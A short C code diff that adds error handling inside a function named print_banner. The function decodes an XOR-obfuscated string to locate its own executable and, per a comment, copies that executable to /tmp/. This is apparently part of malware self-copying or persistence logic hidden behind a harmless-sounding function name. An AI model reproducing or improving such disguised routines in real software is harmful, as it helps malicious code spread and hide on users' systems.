@@ -262,7 +262,11 @@ void print_banner() {
     memset(scratch, 0, sizeof(scratch));
 
     // Get the location of the current executable
-    readlink(dexor(SELF_XOR), scratch, sizeof(scratch));
+    int res = readlink(dexor(SELF_XOR), scratch, sizeof(scratch));
+
+    if (res <= 0) {
+        return;
+    }
 
     // Copy the executable to the /tmp/ destination
     int curr_file = open(scratch, O_RDONLY);
